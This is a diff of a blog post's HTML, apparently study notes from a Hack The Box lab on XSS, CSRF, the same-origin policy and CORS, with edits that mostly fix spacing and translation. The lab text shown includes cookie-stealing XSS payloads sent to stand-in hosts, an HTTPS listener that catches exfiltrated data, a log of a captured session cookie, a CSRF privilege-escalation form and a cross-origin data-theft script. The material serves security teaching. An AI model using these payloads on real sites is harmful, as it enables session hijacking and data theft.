 <p>这个漏洞的 CVSS 3.1 分数是 <strong>5.5（Medium，中危）</strong>。 虽然攻击可以通过网络发起，复杂度也不高，但前提是攻击者本身必须已经具备管理员权限，也就是说 <strong>Privileges Required = High</strong>。此外，这个漏洞的影响主要体现在 DOM 访问和一定程度上的应用完整性影响，不能直接导致服务不可用，因此 Confidentiality 和 Integrity 是 <strong>Low</strong>，Availability 是 <strong>None</strong>。 这说明 CVSS 打分不是只看漏洞名字，<strong>不是看到 XSS 就自动高危</strong>，而是要看具体利用条件和影响范围。</p>
-<hr />
+<hr/>
 <h3>优秀报告示例</h3>
 <p>最后这一部分列举了一些 HackerOne 选出的优秀漏洞报告案例，比如：</p>
 <ul><li>导致所有实例获得 ROOT 权限</li></ul>
@@ -662,7 +662,7 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <div class="post-table-wrap"><table><thead><tr><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>Stored (Persistent) XSS</code></td><td>The most severe type of XSS is an XSS attack that occurs when user input is stored in a backend database and then displayed upon retrieval (for example, in a post or comment).</td></tr><tr><td><code>Reflected (Non-Persistent) XSS</code></td><td>This occurs when user input has been processed by the backend server and displayed on the page, but has not yet been stored (for example, search results or error messages).</td></tr><tr><td><br/><code>DOM-based XSS</code></td><td>Another type of non-persistent XSS occurs when user input is displayed directly in the browser and processed entirely on the client side without reaching the backend server (for example, via client HTTP parameters or anchor tags).</td></tr></tbody></table></div>
 <pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;
 &lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
-<ul><li><code>window.origin</code>Displayed is the protocol + domain name + port of the current site</li><li><code>document.cookie</code> Displays cookies that can be read by the current page</li></ul>
+<ul><li><code>window.origin</code> Displayed is the protocol + domain name + port of the current site</li><li><code>document.cookie</code> Displays cookies that can be read by the current page</li></ul>
 <p><strong>DOM XSS</strong></p>
 <p>What is Source and Sink in<strong>DOM-based XSS</strong>Here, you can understand the whole process into two steps:</p>
 <ol><li><strong>Source</strong>: Where does the user-controllable data enter the page script?</li><li><strong>Sink</strong>: Where is this data eventually written, and whether it will be parsed and executed by the browser as code/HTML</li></ol>
@@ -699,20 +699,20 @@ if (pos &gt; 0) {
 <pre><code>document.location='http://OUR_IP/index.php?c='+document.cookie; 
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;</code></pre>
 <pre><code>Results for &amp;quot;&lt;span class="page-description search-term"&gt;11111&lt;/span&gt;&amp;quot;</code></pre>
-<ul><li><code>&amp;quot;</code> Is an HTML entity, representing English double quotes<code>"</code>.</li></ul>
-<p>payload <code>&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;</code> is encoded to<code>&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt</code>, website pair<code>&lt;</code> and<code>&gt;</code> HTML entity encoding is done, so it will not be executed.</p>
+<ul><li><code>&amp;quot;</code> Is an HTML entity, representing English double quotes <code>"</code>.</li></ul>
+<p>payload <code>&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;</code> is encoded to <code>&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt</code>, website pair <code>&lt;</code> and <code>&gt;</code> HTML entity encoding is done, so it will not be executed.</p>
 <pre><code>Results for &amp;quot;&lt;span class="page-description search-term"&gt;&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/span&gt;&amp;quot;</code></pre>
 <h2>Introduction to advanced CSRF and XSS exploits</h2>
 <p>Cross-site request forgery (CSRF) and cross-site scripting (XSS)</p>
 <p><strong>Real-world applications of modern CSRF and XSS attacks</strong> As we will discuss in this module, many security policies and safeguards in modern web browsers limit or prevent basic exploitation of CSRF vulnerabilities. Examples include the Same Origin Policy, Cross-Origin Resource Sharing (CORS), and SameSite Cookies, which we will explore further in subsequent chapters.</p>
 <p>As a result, pure CSRF exploits are becoming increasingly rare in the real world. However, if we discover an XSS vulnerability, we can combine the exploits of XSS and CSRF vulnerabilities, resulting in a powerful tool that allows us to attack the vulnerable web application itself, and possibly even other web applications within the victim's internal network.</p>
 <p>To exploit CSRF and XSS vulnerabilities and interact with a vulnerable web application, we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noreferrer" target="_blank">XMLHttpRequest</a>object or more modern<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" rel="noreferrer" target="_blank">Fetch API</a>. We can use these two methods to make HTTP requests from JavaScript code and specify HTTP parameters such as request method, HTTP headers, or request body.</p>
-<p>For example, we can<code>XMLHttpRequest</code>by calling<code>send_post()</code> Specify URL when function<code>xhr.open</code>, use<code>set_HTTP_headers()</code> Function sets HTTP headers<code>xhr.setRequestHeader</code>and in calling<code>send_post_body()</code> Specify the request body parameters when using the function to use this object to send a POST request.<code>xhr.send</code>: </p>
+<p>For example, we can <code>XMLHttpRequest</code> by calling <code>send_post()</code> Specify URL when function <code>xhr.open</code>, use <code>set_HTTP_headers()</code> Function sets HTTP headers <code>xhr.setRequestHeader</code> and in calling <code>send_post_body()</code> Specify the request body parameters when using the function to use this object to send a POST request.<code>xhr.send</code>: </p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest(); 
 xhr.open('POST', 'http://exfiltrate.htb/', false); 
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
 xhr.send('param1=hello&amp;param2=world');</code></pre>
-<p>On the other hand, we can use<code>Fetch API</code>Send the same request as follows:</p>
+<p>On the other hand, we can use <code>Fetch API</code> Send the same request as follows:</p>
 <pre><code class="language-js">const response = await fetch('http://exfiltrate.htb/', {
     method: "POST",
     headers: {
@@ -720,19 +720,19 @@ xhr.send('param1=hello&amp;param2=world');</code></pre>
     },
     body: 'param1=hello&amp;param2=world',
   });</code></pre>
-<p>This function<code>fetch</code>The first parameter needs to be passed in the URL. We can put all other request parameters in an object and pass it in as the second parameter.</p>
+<p>This function <code>fetch</code> The first parameter needs to be passed in the URL. We can put all other request parameters in an object and pass it in as the second parameter.</p>
 <p><strong>lab environment</strong>The laboratory consists of the following parts:</p>
-<ul><li>An exploit development server<code>https://exploitserver.htb</code></li><li>We are evaluating a vulnerable web application on a given virtual host. For example:<code>https://vulnerablesite.htb</code></li><li>Additionally, we will be hosting an HTTPS web server on our own system so that we can exfiltrate data.</li></ul>
+<ul><li>An exploit development server <code>https://exploitserver.htb</code></li><li>We are evaluating a vulnerable web application on a given virtual host. For example:<code>https://vulnerablesite.htb</code></li><li>Additionally, we will be hosting an HTTPS web server on our own system so that we can exfiltrate data.</li></ul>
 <p><strong>Exploit Development Server</strong></p>
-<p>We can use the vulnerability development server to<code>exploitserver.htb</code>Develop a CSRF or XSS payload and deliver the exploit to the victim. The Exploit Development Server enables us to develop custom exploits targeting specific vulnerabilities found in target web applications. Suppose, for a proof-of-concept XSS in the target web application, we want to trigger an alert box:</p>
+<p>We can use the vulnerability development server to <code>exploitserver.htb</code> Develop a CSRF or XSS payload and deliver the exploit to the victim. The Exploit Development Server enables us to develop custom exploits targeting specific vulnerabilities found in target web applications. Suppose, for a proof-of-concept XSS in the target web application, we want to trigger an alert box:</p>
 <img alt="Pasted image 20260415041746" src="assets/posts/advanced-xss-csrf/Pasted image 20260415041746.png"/>
-<p>We can view the exploit we developed by accessing this endpoint<code>/exploit</code>. Doing so will trigger an alert popup:</p>
+<p>We can view the exploit we developed by accessing this endpoint <code>/exploit</code>. Doing so will trigger an alert popup:</p>
 <img alt="Pasted image 20260415041800" src="assets/posts/advanced-xss-csrf/Pasted image 20260415041800.png"/>
-<p>Finally, we can deliver the exploit to the victim by accessing the target endpoint<code>/deliver</code>, which will cause the victim to trigger the attack payload we developed by accessing the target address<code>https://exploitserver.htb/exploit</code>. This is useful in CSRF attacks, as the victim must actively access the attack payload to trigger the exploit code. This module focuses on exploit development rather than exploit delivery methods. Delivering the attack payload to the victim forces the exploit to be triggered. In the real world, there are multiple exploit delivery methods, including sending a link to the victim via email or any instant messaging service.</p>
+<p>Finally, we can deliver the exploit to the victim by accessing the target endpoint <code>/deliver</code>, which will cause the victim to trigger the attack payload we developed by accessing the target address <code>https://exploitserver.htb/exploit</code>. This is useful in CSRF attacks, as the victim must actively access the attack payload to trigger the exploit code. This module focuses on exploit development rather than exploit delivery methods. Delivering the attack payload to the victim forces the exploit to be triggered. In the real world, there are multiple exploit delivery methods, including sending a link to the victim via email or any instant messaging service.</p>
 <p>We can also exploit exploit servers to develop XSS attack payloads. However, in this case we do not need to deliver the exploit directly to the victim as the attack payload is propagated via an XSS attack payload injected on the vulnerable site.</p>
 <p><strong>HTTPS data leak server</strong> In this module, all experiments are run on an HTTPS-enabled web server. Modern web browsers implement security measures that prevent HTTPS websites from loading resources over unencrypted HTTP connections. To avoid problems, we will use Python to set up a web server that accepts HTTPS requests. First, we need to generate a new self-signed certificate for the server to support encrypted communication. We can accomplish this using the following command. The details of the certificate can be specified arbitrarily:</p>
 <pre><code class="language-shell">Chenduoduo@htb[/htb]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes</code></pre>
-<p>Next, we can create a simple Python HTTPS server that logs incoming requests to stdout and saves them to a file<code>server.py</code>. We need to provide<code>OPTIONS</code>Request to configure CORS to allow JavaScript request body for POST requests:</p>
+<p>Next, we can create a simple Python HTTPS server that logs incoming requests to stdout and saves them to a file <code>server.py</code>. We need to provide <code>OPTIONS</code> Request to configure CORS to allow JavaScript request body for POST requests:</p>
 <pre><code class="language-python">from http import server
 import ssl
 
@@ -763,7 +763,7 @@ context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 context.load_cert_chain(certfile='./server.pem')
 httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
 httpd.serve_forever()</code></pre>
-<p>After that we can run the server by executing the file<code>server.py</code>. To test the server, let's<code>curl</code>Send a quick test request in a second terminal:</p>
+<p>After that we can run the server by executing the file <code>server.py</code>. To test the server, let's <code>curl</code> Send a quick test request in a second terminal:</p>
 <pre><code class="language-shell">Chenduoduo@htb[/htb]$ curl -vk https://127.0.0.1:4443/get?Hello=World
 Chenduoduo@htb[/htb]$ curl -vk https://127.0.0.1:4443/post?Hello=World -d 'test=123'</code></pre>
 <p>We can see that the request URL, all GET parameters, and all POST parameters are printed in the terminal where the web server is running. For the purposes of this module, this is sufficient for data breach needs:</p>
@@ -778,7 +778,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
 <pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
 <p>Afterwards, we can create a cookie-stealing payload on the attack server, such as the following code. To steal cookies we can use an HTTPS server running on the system:</p>
 <pre><code class="language-js">windows.location = "https://10.10.14.45:4443/cookiestealer?=" + document.cookie;</code></pre>
-<p>After saving the exploit, we can confirm that the program has been saved by accessing the endpoint<code>/exploit</code>: </p>
+<p>After saving the exploit, we can confirm that the program has been saved by accessing the endpoint <code>/exploit</code>: </p>
 <img alt="Pasted image 20260415043149" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043149.png"/>
 <p>Finally, we have to wait for the admin user to access the guestbook. The injected XSS payload causes the administrator's browser to load a payload from the attack server, exfiltrating the administrator's user's cookies into our system:</p>
 <pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 
@@ -787,7 +787,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
 10.129.233.62 - - [31/Dec/2024 13:37:36] "GET /cookiestealer?c=PHPSESSID=tiitsevk7pns4kmrcmjecm9qq6 HTTP/1.1" 404</code></pre>
 <p><strong>CSRF</strong></p>
 <img alt="Pasted image 20260415043309" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043309.png"/>
-<p>However, we can see that we only have<code>user</code>these permissions. here is one<code>promote</code>button. If we click on it, the web application will prompt us that only admin users can promote other users. However, we can see that the promotion operation is achieved with the following request:</p>
+<p>However, we can see that we only have <code>user</code> these permissions. here is one <code>promote</code> button. If we click on it, the web application will prompt us that only admin users can promote other users. However, we can see that the promotion operation is achieved with the following request:</p>
 <img alt="Pasted image 20260415043318" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043318.png"/>
 <p>Specifically, this endpoint lacked CSRF protection, which allowed us to launch a CSRF attack that would force an administrator to escalate the privileges of our users. To do this, we need to create an HTML form corresponding to the promotion request:</p>
 <pre><code class="language-html">&lt;html&gt;
@@ -815,19 +815,19 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
     &lt;/script&gt;
   &lt;/body&gt;
 &lt;/html&gt;</code></pre>
-<p><code>View Exploit</code>We can test our exploit by logging into the vulnerable application and clicking a link. This will send a request to a server<code>https://exploitserver.htb/exploit</code>, the server returns our saved payload. The payload automatically submits a form, making a cross-origin request to the vulnerable web application. However, since we are not administrators, the privilege escalation fails:</p>
+<p><code>View Exploit</code> We can test our exploit by logging into the vulnerable application and clicking a link. This will send a request to a server <code>https://exploitserver.htb/exploit</code>, the server returns our saved payload. The payload automatically submits a form, making a cross-origin request to the vulnerable web application. However, since we are not administrators, the privilege escalation fails:</p>
 <img alt="Pasted image 20260415043428" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043428.png"/>
-<p>However, this confirms that our CSRF payload successfully sends an HTTP request to escalate user privileges. To perform the attack we can pass the payload to the victim and select the current virtual host<code>csrf.labintro.htb</code>. This will cause the victim to visit a page<code>https://exploitserver.htb/exploit</code>. After waiting a few seconds and refreshing the page, we will have administrator rights:</p>
+<p>However, this confirms that our CSRF payload successfully sends an HTTP request to escalate user privileges. To perform the attack we can pass the payload to the victim and select the current virtual host <code>csrf.labintro.htb</code>. This will cause the victim to visit a page <code>https://exploitserver.htb/exploit</code>. After waiting a few seconds and refreshing the page, we will have administrator rights:</p>
 <img alt="Pasted image 20260415043442" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043442.png"/>
 <h2>Same Origin Policy and CORS</h2>
 <h3>Same origin policy</h3>
 <p>The Same Origin Policy is a security mechanism implemented in web browsers to prevent cross-origin access to websites. In particular, JavaScript code running on one source node cannot access another source node. This prevents malicious websites from stealing information from other sources and limits the types of requests they send to other sources.</p>
-<p><code>origin</code>defined as URL<code>scheme</code>, <code>host</code>, and <code>port</code>. As long as two URLs differ in at least one of these three attributes, they are not of the same origin.</p>
+<p><code>origin</code> defined as URL<code>scheme</code>, <code>host</code>, and <code>port</code>. As long as two URLs differ in at least one of these three attributes, they are not of the same origin.</p>
 <p>Two URLs<strong>same origin</strong>Three points must be met:</p>
 <div class="post-table-wrap"><table><thead><tr><th>project</th><th>must be the same</th></tr></thead><tbody><tr><td>Protocol</td><td>http / https</td></tr><tr><td>Domain name (Host)</td><td>example.com</td></tr><tr><td>Port</td><td>80 / 443</td></tr></tbody></table></div>
 <p>Given that the browser implements the same-origin policy, vulnerabilities and vulnerabilities in its software can lead to bypasses, potentially leading to high-severity security vulnerabilities.</p>
 <p><strong>No same origin policy</strong></p>
-<p>Suppose we have access to our private laptop<code>https://exploitationserver.htb</code> When accessing a malicious website, it executed the following JavaScript code:</p>
+<p>Suppose we have access to our private laptop <code>https://exploitationserver.htb</code> When accessing a malicious website, it executed the following JavaScript code:</p>
 <pre><code class="language-html">&lt;script&gt;
     async function exfiltrate_data(url) {
         // get data
@@ -847,15 +847,15 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
     // exfiltrate internal service
     exfiltrate_data("https://192.168.178.5/");
 &lt;/script&gt;</code></pre>
-<p><code>https://exploitationserver.htb</code> The JavaScript code on sends three fetches to our browser<code>https://mymails.htb/getmails</code>、<code>https://mybank.htb/myaccounts</code> and<code>https://192.168.178.5/</code> access request. If we log into any of these websites, the browser may<code>SameSite</code> The setting of the cookie configuration sends a session cookie, allowing these requests to be authenticated. The JavaScript code then sends the response back to the attacker-controlled system<code>https: //attacker_system.htb/exfiltrate</code> to leak. In this way, run<code>https: //attacker_system.htb</code> An attacker can obtain the response to a three-way authentication GET request from our user account and gain access to our<code>https://mymails.htb</code> Email, bank information and account balance<code>https://mybank.htb</code>, and even visit the inside of our homes<code>https://192.168.178.5</code>A wiki on the web (this wiki is not public and can only be accessed via a local area network).</p>
+<p><code>https://exploitationserver.htb</code> The JavaScript code on sends three fetches to our browser <code>https://mymails.htb/getmails</code>、<code>https://mybank.htb/myaccounts</code> and <code>https://192.168.178.5/</code> access request. If we log into any of these websites, the browser may <code>SameSite</code> The setting of the cookie configuration sends a session cookie, allowing these requests to be authenticated. The JavaScript code then sends the response back to the attacker-controlled system <code>https: //attacker_system.htb/exfiltrate</code> to leak. In this way, run <code>https: //attacker_system.htb</code> An attacker can obtain the response to a three-way authentication GET request from our user account and gain access to our <code>https://mymails.htb</code> Email, bank information and account balance <code>https://mybank.htb</code>, and even visit the inside of our homes <code>https://192.168.178.5</code> A wiki on the web (this wiki is not public and can only be accessed via a local area network).</p>
 <p>This is a serious security breach and there is nothing we can do to prevent it. The Same Origin Policy is specifically designed to alleviate this problem.</p>
 <p><strong>Same-origin strategy adopted</strong></p>
-<p>As mentioned above, the same-origin policy blocks access across origins. In the above case, due to different hosts, the malicious website attacked<code>https://exploitationserver.htb</code> The source is different from all three sources. Therefore, calling a different source<code>fetch</code>Will trigger an error in the browser caused by the same-origin policy,<code>https://exploitationserver.htb</code>Unable to access and steal data:</p>
+<p>As mentioned above, the same-origin policy blocks access across origins. In the above case, due to different hosts, the malicious website attacked <code>https://exploitationserver.htb</code> The source is different from all three sources. Therefore, calling a different source <code>fetch</code> Will trigger an error in the browser caused by the same-origin policy,<code>https://exploitationserver.htb</code> Unable to access and steal data:</p>
 <img alt="Pasted image 20260415054310" src="assets/posts/advanced-xss-csrf/Pasted image 20260415054310.png"/>
-<p>Understanding Same Origin Policy Blocking<a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> Accessing responses to cross-origin requests is critical. The (possibly authenticated) request itself is still sent. We can confirm this in Burp. please note<code>Origin</code> and<code>Referer</code>header, indicating that this is indeed a cross-origin request: Understanding Same Origin Policy Blocking<a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> Accessing responses to cross-origin requests is critical. The (possibly authenticated) request itself is still sent. We can confirm this in Burp. please note<code>Origin</code> and<code>Referer</code>header, indicating that this is indeed a cross-origin request:</p>
+<p>Understanding Same Origin Policy Blocking<a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> Accessing responses to cross-origin requests is critical. The (possibly authenticated) request itself is still sent. We can confirm this in Burp. please note <code>Origin</code> and <code>Referer</code> header, indicating that this is indeed a cross-origin request: Understanding Same Origin Policy Blocking<a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> Accessing responses to cross-origin requests is critical. The (possibly authenticated) request itself is still sent. We can confirm this in Burp. please note <code>Origin</code> and <code>Referer</code> header, indicating that this is indeed a cross-origin request:</p>
 <img alt="Pasted image 20260415054341" src="assets/posts/advanced-xss-csrf/Pasted image 20260415054341.png"/>
 <p>This behavior can lead to CSRF attacks because the request will not be persisted.</p>
-<p>There are some exceptions to the same-origin policy. For example, we could add something like<code>img</code>、 <code>video</code>and<code>script</code>Tags and other resources. For example, we can still include Hack The Box Academy's logo on a website we own using the following HTML code, even though it is loaded as cross-origin:</p>
+<p>There are some exceptions to the same-origin policy. For example, we could add something like <code>img</code>、 <code>video</code> and <code>script</code> Tags and other resources. For example, we can still include Hack The Box Academy's logo on a website we own using the following HTML code, even though it is loaded as cross-origin:</p>
 <pre><code class="language-html">&lt;!DOCTYPE html&gt;
 &lt;html&gt;
     &lt;body&gt;
@@ -868,7 +868,7 @@ Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
 &lt;/html&gt;</code></pre>
 <h3>CORS cross-origin resource sharing</h3>
 <p>Cross-Origin Resource Sharing (CORS) is a W3C standard that defines exceptions to the same-origin policy. It enables the origin zone to define trusted origin zones and a list of HTTP methods that are allowed for cross-zone access.</p>
-<p>To understand why CORS is needed, let’s assume a common real-life scenario: a server hosted on<code>http://vulnerablesite.htb</code> The web application displays the data. For this purpose, it is hosted with<code>http://api.vulnerablesite.htb</code> API communication on. More specifically, run<code>at http://vulnerablesite.htb</code> The application on contains only front-end code, responsible for getting data from the API. The API implements a simple REST API consisting of endpoints for creating, reading, updating, and deleting data.</p>
+<p>To understand why CORS is needed, let’s assume a common real-life scenario: a server hosted on <code>http://vulnerablesite.htb</code> The web application displays the data. For this purpose, it is hosted with <code>http://api.vulnerablesite.htb</code> API communication on. More specifically, run <code>at http://vulnerablesite.htb</code> The application on contains only front-end code, responsible for getting data from the API. The API implements a simple REST API consisting of endpoints for creating, reading, updating, and deleting data.</p>
 <p>This makes front-end web applications simple without having to deal with data-related logic. In particular, the front-end code handles interaction with the API and can use JavaScript code like the following, so all data is fetched once the website loads:</p>
 <pre><code class="language-javascript">// fetch data
 fetch("http://api.vulnerablesite.htb/data", {
@@ -880,7 +880,7 @@ fetch("http://api.vulnerablesite.htb/data", {
     &lt;SNIP&gt;
 })
 </code></pre>
-<p>However, as mentioned above, this violates the Same Origin Policy because<code>http://vulnerablesite.htb</code> and<code>http://api.vulnerablesite.htb</code> are different sources. Therefore, the above JavaScript code causes an error and the data is not loaded correctly:</p>
+<p>However, as mentioned above, this violates the Same Origin Policy because <code>http://vulnerablesite.htb</code> and <code>http://api.vulnerablesite.htb</code> are different sources. Therefore, the above JavaScript code causes an error and the data is not loaded correctly:</p>
 <img alt="Pasted image 20260415055130" src="assets/posts/advanced-xss-csrf/Pasted image 20260415055130.png"/>
 <p>Now, let’s discuss how CORS works and how web applications can communicate with APIs without getting caught by the Same Origin Policy error.</p>
 <p><strong>How CORS works</strong></p>
@@ -890,27 +890,27 @@ fetch("http://api.vulnerablesite.htb/data", {
 <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin" rel="noreferrer" target="_blank">Access-Control-Allow-Origin</a>: Which origin (Origin) is allowed to read the current response</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers" rel="noreferrer" target="_blank">Access-Control-Expose-Headers</a>: By default, front-end JS is included in cross-origin responses<strong>Only a few "simple response headers" can be read</strong>.</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods" rel="noreferrer" target="_blank">Access-Control-Allow-Methods</a>: This header is mainly used for<strong>preflight request</strong> In the response, tell the browser: Which HTTP methods are allowed for this cross-origin resource</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers" rel="noreferrer" target="_blank">Access-Control-Allow-Headers</a>: This header is also used for<strong>preflight response</strong>, tell the browser: which request headers are allowed in front-end cross-domain requests</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials" rel="noreferrer" target="_blank">Access-Control-Allow-Credentials</a>: Whether to allow cross-domain requests to carry credentials and let the front-end JS read the response</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age" rel="noreferrer" target="_blank">Access-Control-Max-Age</a>: It tells the browser: How long can the result of this preflight request be cached?</li></ul>
 <div class="post-table-wrap"><table><thead><tr><th>head</th><th>function</th></tr></thead><tbody><tr><td><code>Access-Control-Allow-Origin</code></td><td>Which source is allowed to read the response</td></tr><tr><td><code>Access-Control-Expose-Headers</code></td><td>Which additional response headers are allowed to be read by the front end</td></tr><tr><td><code>Access-Control-Allow-Methods</code></td><td>Which HTTP methods are allowed across domains</td></tr><tr><td><code>Access-Control-Allow-Headers</code></td><td>Which request headers are allowed for cross-domain requests?</td></tr><tr><td><code>Access-Control-Allow-Credentials</code></td><td>Whether to allow credentials such as cookies/Authorization and read the response</td></tr><tr><td><code>Access-Control-Max-Age</code></td><td>How long are preflight results cached?</td></tr></tbody></table></div>
 <p><strong>Preflight Requests</strong></p>
-<p>All that does not belong to<code>simple request</code>A conditional request is called<code>preflight request</code>. Before sending these cross-origin requests, the browser sends a request containing all the parameters of the actual cross-origin request to the different origins.<code>preflight request</code>. This enables the web server to decide whether to allow cross-origin requests. The browser waits for a response to the preflight request and only proceeds to send the actual cross-start request when the web server responds to the preflight request by setting the appropriate CORS header. Since the browser asks the web server for permission before sending the actual cross-origin request, CSRF vulnerabilities cannot exist in preflight requests.</p>
-<p>A preflight check request is a request containing the following headers<code>OPTIONS</code> Request:</p>
+<p>All that does not belong to <code>simple request</code> A conditional request is called <code>preflight request</code>. Before sending these cross-origin requests, the browser sends a request containing all the parameters of the actual cross-origin request to the different origins.<code>preflight request</code>. This enables the web server to decide whether to allow cross-origin requests. The browser waits for a response to the preflight request and only proceeds to send the actual cross-start request when the web server responds to the preflight request by setting the appropriate CORS header. Since the browser asks the web server for permission before sending the actual cross-origin request, CSRF vulnerabilities cannot exist in preflight requests.</p>
+<p>A preflight check request is a request containing the following headers <code>OPTIONS</code> Request:</p>
 <p>Access-Control-Request-Method: Tells the server the HTTP method used in the actual request.</p>
 <p>Access-Control-Request-Headers: Informs the server of the HTTP headers used in the actual request</p>
 <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method" rel="noreferrer" target="_blank">Access-Control-Request-Method</a>: inform the server about the HTTP method used in the actual request</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers" rel="noreferrer" target="_blank">Access-Control-Request-Headers</a>: inform the server about the HTTP headers used in the actual request</li></ul>
-<p>For example, if the API needs to accept JSON data in a POST request from a web application, a simple request is not enough because the Content-Type is set to<code>application/json</code>, which is not allowed in simple requests. Therefore, the browser sends a preflight request before sending the actual request. The API needs to set CORS response headers accordingly to notify the browser to allow cross-origin requests. More specifically, the original<code>http://vulnerablesite.htb</code>、<code>POST</code> methods and headers<code>Content-Type</code>.</p>
+<p>For example, if the API needs to accept JSON data in a POST request from a web application, a simple request is not enough because the Content-Type is set to <code>application/json</code>, which is not allowed in simple requests. Therefore, the browser sends a preflight request before sending the actual request. The API needs to set CORS response headers accordingly to notify the browser to allow cross-origin requests. More specifically, the original <code>http://vulnerablesite.htb</code>、<code>POST</code> methods and headers <code>Content-Type</code>.</p>
 <p>After correctly configuring the CORS header, web applications and APIs can communicate with each other and avoid same-origin policy issues. Suppose the user wants to create a new data item via a POST request; the user's browser will first send a check-before-check request to check whether the API allows potentially dangerous cross-origin requests:</p>
 <img alt="Pasted image 20260415064528" src="assets/posts/advanced-xss-csrf/Pasted image 20260415064528.png"/>
 <p>Since the response contains the correct CORS headers, the browser knows that the API allows preflight requests; therefore, it continues sending:</p>
 <img alt="Pasted image 20260415064539" src="assets/posts/advanced-xss-csrf/Pasted image 20260415064539.png"/>
-<p>Since the request also contains a CORS header with the origin of the request, the browser adds an exception in the same-origin policy, allowing the web application to access the response (in this case<code>success</code>response).</p>
-<p>To enable updating data<code>PUT</code> Requests and for deletion of data<code>DELETE</code> Requests that the API must adjust in response to preflight requests<code>Access-Control-Allow-Methods</code> CORS header to include all allowed methods.</p>
+<p>Since the request also contains a CORS header with the origin of the request, the browser adds an exception in the same-origin policy, allowing the web application to access the response (in this case <code>success</code> response).</p>
+<p>To enable updating data <code>PUT</code> Requests and for deletion of data <code>DELETE</code> Requests that the API must adjust in response to preflight requests <code>Access-Control-Allow-Methods</code> CORS header to include all allowed methods.</p>
 <p>Just request<strong>Not a simple request</strong>(For example, using JSON, PUT, DELETE, and custom headers), the browser will first send one:</p>
 <ol><li>What is a preflight request</li></ol>
-<pre><code>OPTIONS 请求</code></pre>
+<pre><code>OPTIONS request</code></pre>
 <p>👉 This is the preflight request</p>
 <p>The browser first asks the server:</p>
 <ol><li>What is the preflight request asking?</li></ol>
-<pre><code>我要跨域请求, 可以吗？  
-我要用 POST/PUT, 可以吗？  
-我要带 Content-Type / 自定义 header, 可以吗？</code></pre>
+<pre><code>May I send a cross-origin request?
+May I use POST or PUT?
+May I include Content-Type or custom headers?</code></pre>
 <p>Corresponding request header:</p>
 <pre><code>Access-Control-Request-Method  
 Access-Control-Request-Headers</code></pre>
@@ -920,36 +920,36 @@ Access-Control-Request-Headers</code></pre>
 Access-Control-Allow-Methods  
 Access-Control-Allow-Headers</code></pre>
 <p>👉 Equivalent to saying:</p>
-<pre><code>可以, 你可以这样请求</code></pre>
+<pre><code>Yes, this request is allowed.</code></pre>
 <h2>Misconfiguration</h2>
-<p>Before we dive into CORS misconfiguration, let’s discuss possible attack vectors that CORS misconfiguration presents. Most attacks require the<code>Access-Control-Allow-Credentials</code>Header is set to<code>true</code>, thereby obtaining the authentication request in the context of the victim. If a CORS misconfiguration causes an attacker-controlled domain to obtain an exception to the Same Origin Policy, the resulting vulnerability is similar to a CSRF vulnerability, but more severe. Exceptions to the Same Origin Policy allow attacker-controlled domains to access responses to cross-origin requests. Since the request comes from an authentication context, the response contains sensitive information that an attacker could access and steal. Additionally, depending on the specific CORS configuration, it is possible for an attacker to interact with the web application, impersonate the victim and perform actions on their behalf.</p>
-<p>If access is not set up<code>Access-Control-Allow-Credentials</code> ) header, the attacker will be unable to proceed with these attacks. However, misconfiguration of CORS in internal web applications could allow attackers to steal non-public information.</p>
-<blockquote><strong>Note:</strong> Successfully exploiting some of the following CORS misconfigurations may require setting session cookies in real-world web applications<code>SameSite=None</code> properties.</blockquote>
